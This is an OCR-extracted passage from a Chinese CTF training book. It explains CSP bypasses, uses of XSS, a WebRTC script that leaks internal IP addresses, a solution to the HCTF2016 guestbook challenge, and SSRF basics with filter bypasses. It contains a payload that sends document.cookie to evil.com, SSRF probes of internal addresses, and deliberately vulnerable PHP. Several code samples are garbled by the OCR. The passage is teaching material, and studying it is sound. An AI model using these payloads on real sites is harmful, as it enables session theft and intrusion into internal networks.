在实际场景中，常常会出现CSP策略配置错误的情形，错误场景
列举如下。
---
## Page 99
CTF特训营：技术详解、解题方法与
3.3防护与绕过
99/1144
策略定义不全或未使用default-src来补全。
script-src的源列表包含unsafe-inline（并且没有使用nonce或
hash策略）或允许data伪协议。
script-src或object-src源列表包含攻击者可控制的部分源地址
（文件上传、JSONHijacking、SOME攻击），或者包含不安全的库。
源地址列表滥用通配符。
在这些场景下很容易利用其错误配置对CSP进行绕过。例如，当
包含unsafe-inline关键词但未使用nonce或hash策略时，可直接使用事
件属性或script标签执行代码。
(2）unsafe-inline下的绕过
CSP策略如下：
default-src'self;script-src'self'unsafe-inline
除script开启unsafe-inline模式之外，其余资源仅允许加载同域
此时可用的绕过方法有如下几种。
---
## Page 100
CTF特训营：技术详解、解题方法与
3.3防护与绕过
100/1144
DNSPrefetch。由于link标签最新的rel属性dns-prefetch尚未被加
入CSP实现中，使用如下Payload即可发出一条DNS解析请求，在NS
服务器下查看解析日志便可得到如下内容：
location.href。大部分的网站跳转还是要依赖前端来进行，所以
在CSP中是无法对location.href做出限制的，依此可以衍生出大量的
绕过方式：
I/ bypass1
I/bypass2
l/bypass3
（3）严苛规则script-src'self下的绕过
CSP策略如下：
default-src'self;script-src'self
---
## Page 101
CTF特训营：技术详解、解题方法与
3.3防护与绕过
101/1144
关闭unsafe-inline模式，所有资源仅充许加载同域。此时可使用
如下绕过方法：重定向（302跳转）导致的绕过。
在W3C文档中，关于重定向的说明引I用如下：
4.2.2.3.Paths and Redirects
Toavoidleakingpathinformationcross-origin（asdiscussedin
EgorHomakov'sUsingContent-Security-Policy forEvil),the matching
algorithmignoresthepathcomponentofasourceexpressionifthe
resourcebeingloadedistheresultofaredirect.Forexample,givena
path:
doesn't matchthepolicy
Directlyloadinghttps://example.com/redirectorwouldpass,asit
matchesexample.com.
Assumingthathttps://example.com/redirectordeliveredaredirect
responsepointing tohttps://not-example.com/not-path,theloadwould
---
## Page 102
CTF特训营：技术详解、解题方法与
3.3防护与绕过
102/1144
可以看出，如果将script-src设置为某个目录，通过该目录下的
302跳转是可以绕过CSP读取到记载其他目录的资源的。
CSP策略如下：
default-src'self;script-srchttp://example.com/a/
可使用下面的Payload进行攻击：
http://example.com/xss.php?input=
（4）CRLF导致的绕过
在HTTP响应头中注入[CRLF][CRLF]，将CSP头部分割至HTTP响
应体中，这样注入的XSS代码便不再受到CSP的影响。
---
## Page 103
CTF特训营：技术详解、解题方法与
3.4危害与利用技巧
103/1144
3.4危害与利用技巧
XSS漏洞利用的基础是脚本，攻击发生的位置是客户端浏览器
也就是说，在浏览器中脚本所能做的事情通过XSS漏洞都可以完成
而不仅仅是锈取cookie。XSS漏洞可以实现的功能包括但不限于
窃取用户Cookie信息，伪造用户身份：
与浏览器DOM对象进行交互，执行受害者所有可以执行的操作：
获取网页源码；
发起HTTP请求；
使用HTML5GeolocationAPl获取地理位置信息
使用WebRTCAPI获取网络信息
发起HTTP请求对内网主机进行扫描，对存在漏洞的主机进行攻
击；
如下代码展示了如何使用WebRTCAP获取网络信息：
---
## Page 104
CTF特训营：技术详解、解题方法与
3.4危害与利用技巧
104/1144
/获取与账户关联的IP地址
function getlPs(callback)
varip_dups=;
//兼容Firefox和Chrome
varRTCPeerConnection=window.RTCPeerConnection
lwindow.mozRTCPeerConnection
Ilwindow.webkitRTCPeerConnection;
varuseWebKit=!window.webkitRTCPeerConnection;
//使用iframe绕过webrtc的拦截
if(IRTCPeerConnection)
/注意：你需要在script标签上方的页面中有一个iframe标签，比如
/
I/..这里调用getPs...
var win=iframe.contentWindow;
RTCPeerConnection=win.RTCPeerConnection
Ilwin.mozRTCPeerConnection
|win.webkitRTCPeerConnection;
useWebKit = Ilwin.webkitRTCPeerConnection;
//数据连接的最低要求
varmediaConstraints={
optional:[{RtpDataChannels:true)]
var servers ={iceServers:[{urls:"stun:stun.services.mozilla.com]};
//构造一个RTCPeerConnection对象
varpc=new RTCPeerConnection(servers,mediaConstraints);
functionhandleCandidate(candidate)
/仅匹配IP地址
-0-0--x
varip_addr=ip_regex.exec(candidate)[1];
/删除重复项
if(ip_dups[ip_addr] === undefined)
callback(ip_addr);
ip_dups[ip_addr]= true;
//监听candidate事件
pc.onicecandidate=function(ice)
/跳过非candidate事件
if(ice.candidate)
handleCandidate(ice.candidate.candidate);
//创建伪造的数据通道
pc.createDataChannel();
---
## Page 105
CTF特训营：技术详解、解题方法与
3.4危害与利用技巧
105/1144
pc.createOffer（function(result)
pc.setLocalDescription（result,function(),function());
},function(）
//—秒后执行
setTimeout(function（)
/从本地描述中读取candidate信息
var lines = pc.localDescription.sdp.split(n);
lines.forEach（function(line)
if(line.indexOf('a=candidate:)===0)
handleCandidate(line);
）
},1000);
/测试
getlPs(function(ip){document.write(ip +‘);});
访问结果如图3-6所示，成功显示出了IP信息
burpsuite (java)
31
example.com/webrtc.html
1,functionO0）;
CO
①example....
日
/witforawhile tdlet
应用InkSec
Android
Other
其他书签
SetTim
outCfunctionO
fofrom1ocml
192.168.3.220
varlines-pc.localDescription.sdp.split（'Vn'）;
Lines.forEach(function(line)
handleCandidate(line);
0
）:
nCip)(doc
t.writeCip+
E:C.q
80,9
Bot
图3-6WebRTC获取IP地址
这里再推荐一个非常好用的开源XSS漏洞利用平台：
BeEF（TheBrowserExploitationFramework），项目地址为https://
---
## Page 106
CTF特训营：技术详解、解题方法与
3.4危害与利用技巧
106/1144
github.com/beefproject/beeff。该平台中包含大量xSS代码，可供参考
和学习。
---
## Page 107
CTF特训营：技术详解、解题方法与
3.5实例
107/1144
3.5实例
HCTF2016中有一道xSS漏洞相关的题目：guestbook。该题目
代码中的过滤代码如下：
function flter(Sstring)
$escape = array(1,1l);
$escape=.implode(T，$escape).;
$string=preg_replace($escape,_,$string);
$safe=array（select，,insert，,update，,delete’，where）;
$safe =.implode(T，Ssafe).;
$string =preg_replace($safe,hacker',Sstring);
$xsssafe=array（img,script',on',svg，link);
$xsssafe=.implode(T，$xsssafe)./²;
returnpreg_replace($xsssafe,",$string)
可以看到，这段代码中其实只有很少的过滤，而且都是单层的
只需要复写2次就可以绕过，例如：
scrscriptipt
这个题目考查的关键点在于CSP的绕过，CSP规则如下：
default-src'self;script-src’selfunsafe-inline';font-src’selffonts.gstatic.com;style-
src'self‘unsafe-inline’;img-srcself
---
## Page 108
CTF特训营：技术详解、解题方法与
3.5实例
108/1144
这段CSP规则中，由于开启了unsafe-inline，因此可以使用前文
提到过的CSP绕过的方法进行绕过，例如：
document.cookie);
上面代码中的locatioonn.href并非笔误，而是因为过滤函数中过
滤了on，所以此处的locatioonn经过过滤后就变成了正确的location
另外还可以用下面的方法进行绕过：
var|= document.createElement(liscriptnk");l.setAttribute("rel",“
prefetch");1.setAttribute("href", "//evil.com:2333/" + document.cookie); document.
head.appendChild(l);
---
## Page 109
CTF特训营：技术详解、解题方法与
第4章服务端请求伪造
109/1144
第4章服务端请求伪造
很多Web应用都提供了从其他的服务器上获取数据的功能，根据
用户指定的URL，Web应用可以获取图片、下载文件、读取文件内容
等。这种功能如果被恶意使用，将导致存在缺陷的Web应用被作为代
理通道去攻击本地或远程服务器。这种形式的攻击被称为服务端请求
伪造攻击（Server-sideRequestForgery，SSRF）。
---
## Page 110
CTF特训营：技术详解、解题方法与
4.1如何形成
110/1144
4.1如何形成
SSRF形成的原因大都是由于服务端提供了从其他服务器或应用
中获取数据的功能，但没有对目标地址做出有效的过滤与限制造成
的。
比如，一个正常的Web应用本应该从指定URL获取网页文本内容
或加载指定地址的图片，而攻击者利用漏洞伪造服务器端发起请求
从而突破了客户端获取不到数据的限制，如内网资源、服务器本地资
源等。
为了方便读者理解，下面举例说明，请考虑如下代码
?php
$url =$_GET[url];
echofile_get_contents(Surl);
?>
这段代码使用file_get_contents函数从用户指定的uRL获取图片
并展示给用户。此时如果攻击者提交如下Payload，就可以获取到内
网主机HTTP服务8000端口的开放情况（http://example.com/ssrf.php？
url=http://192.168.252.1:8000/)
---
## Page 111
CTF特训营：技术详解、解题方法与
4.1如何形成
111/1144
图4-1所示的就是一个SSRF攻击的示例。
1.python-m SimpleHTTPServer（Python)
burpsuite (java)
1
python (Python)
Directory listing for /
X
X2
X
~/Desktop/SSRF (zsh)
①example.com/st
C
?
三
total8
666SSRF 1s-1
InkSec
Android -
GitHub
rw-r--r--
1wobzsy
staff
71518:41imoge.jpg
1wobzsy
971518:38ssrf_flag
INT
SQL·xSS·Encryption·
rW-
-p==
staff
Enc
666 SSRF
Load URL
http://example.com/ssrf.php
Split URL
?url=http://192.168.252.1:8000
python (Python)
999 SSRF python
-m SimpleHTTPServer
Execute
Serving HTTP on 0.0.0.0 port 8000
Enable Post dataEnable Referrer
192.168.252.141 - - [15/3uL/2017 18:50:40] *GET / HT
Directorylistingfor/
TP/1.0"200-
root@lnkSecKali:/var/www/html (ssh)
ooteInkSecKali:/var/ww/html#catssrf.php
·ssrfflag
.image.jpg
c?php
n,as =ns
echo file_get_contents(Sur1);
图4-1
SSRF攻击示例
---
## Page 112
CTF特训营：技术详解、解题方法与
4.2防护绕过
112/1144
4.2防护绕过
很多开发者使用正则表达式的方式对SSRF中的请求地址进行过
滤，具体表现如下。
限制请求特定域名。
禁止请求内网IP。
然而，这两种过滤都很容易被绕过，可用的方法具体如下
1）使用http://PI:EMAIL这种格式来绕过正则。
2）IP地址转为进制（八进制、十进制、十六进制）及IP地址省
略写法，举例说明如下。
0177.00.00.01（八进制）
2130706433（十进制）